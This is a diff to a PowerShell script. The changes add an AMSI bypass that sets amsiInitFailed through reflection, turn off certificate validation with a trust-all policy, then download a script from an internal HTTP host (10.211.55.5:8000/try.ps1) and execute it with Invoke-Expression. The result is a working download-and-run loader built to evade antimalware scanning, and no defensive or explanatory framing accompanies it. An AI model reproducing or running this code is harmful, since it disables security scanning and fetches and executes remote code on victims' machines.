@@ -1,19 +1,22 @@
 
+$asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$asm.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+
 
 $scriptUrl = "http://10.211.55.5:8000/try.ps1"
 
 
 try {
-    $response = Invoke-RestMethod -Uri $scriptUrl -UseBasicParsing
-    $scriptContent = $response.Content
+   
+    $webClient = New-Object Net.WebClient
+    Add-Type -TypeDefinition "using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCerts : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate cert, WebRequest request, int certificateProblem) { return true; } }"
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
+    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts
+    $scriptContent = $webClient.DownloadString($scriptUrl)
 } catch {
-    Write-Host "Error: $_"
+    Write-Host "Error downloading: $_"
     exit
 }
 
 
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
-$base64 = [System.Convert]::ToBase64String($bytes)
-
-
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) | Invoke-Expression
+$null = Invoke-Expression $scriptContent
